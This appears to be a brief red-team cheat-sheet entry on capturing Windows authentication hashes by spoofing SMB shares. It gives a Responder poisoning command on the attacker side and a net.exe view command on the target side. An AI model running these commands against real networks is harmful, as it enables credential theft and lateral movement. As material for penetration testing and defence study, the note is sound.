---
author(s):
  - Userware
tags:
  - initial-access
  - sniffing-and-spoofing
  - weaponization
  - client-side-attacks
  - scenarios
  - network-protocols
  - smb
---
# 01 - Capture Hashes via Spoof SMB Shares

## 1.1 - Attacker

```
$ sudo responder -I <interface> -rdwv
```

## 1.2 - Target

```
C:\> net.exe view \\snare
```

---
## References

### Backlinks

- [[SMB Names Examples]]